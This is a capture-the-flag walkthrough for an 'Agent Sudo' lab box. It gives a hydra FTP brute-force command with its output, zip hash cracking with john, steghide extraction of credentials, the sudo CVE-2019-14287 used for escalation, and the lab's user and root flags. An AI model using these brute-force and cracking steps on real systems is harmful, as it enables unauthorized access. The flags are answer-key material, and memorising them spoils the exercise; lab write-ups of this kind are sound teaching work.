# Agent Sudo

```bash
export IP=10.10.38.179
```


[nmap output](nmap/initial)
* 21: ftp
* 22: ssh
* 80: http

## Task 2: Enumerate
**How many open ports?**
```
3
```

**How you redirect yourself to a secret page?**
```
user-agent
```

**What is the agent name?**  
I used burpsuite intruder and replaced the user agent with letters, C gave different response length and status code. Location header gave us `agent_C_attention.php`. The name was in this file.
```
chris
```

## Task 3: Hash cracking and brute-force
**FTP password**  
```bash 
hydra -l chris -P rockyou.txt $IP ftp
# [21][ftp] host: 10.10.38.179   login: chris   password: crystal
```

**Zip file password**  
Binwalk found a zip file inside cutie.png. Using john to crack it:
```bash
zip2john 8702.zip > 8702.john
john --wordlist=rockyou.txt 8702.john
# alien            (8702.zip/To_agentR.txt)
# Agent C,
#
# We need to send the picture to 'QXJlYTUx' as soon as possible!
#
# By,
# Agent R
echo QXJlYTUx | base64 -d
# Area 51
```

**steg password**  
```bash
Area 51
steghide -sf cute-alien.jpg -p Area51
# message.txt:
# Hi james,
#
# Glad you find this message. Your login password is hackerrules!
#
# Don't ask me why the password look cheesy, ask agent R who set this password for you.
#
# Your buddy,
# chris
```

**Who is the other agent (in full name)?**
```
James
```

**SSH password**
```
hackerrules!
```

## Task 4: Capture the user flag
**What is the user flag?**
```
b03d975e8c92a7c04146cfa7a5a313c7
```

**What is the incident of the photo called?**
```
Roswell alien autopsy
```

## Task 5: Privilege escalation
**CVE number for the escalation**
```bash
# https://blog.aquasec.com/cve-2019-14287-sudo-linux-vulnerability
CVE-2019-14287
```

**What is the root flag?**
```
b53a02f55b57d4439e3341834d70c062
```

**(Bonus) Who is Agent R?**
```
DesKel
```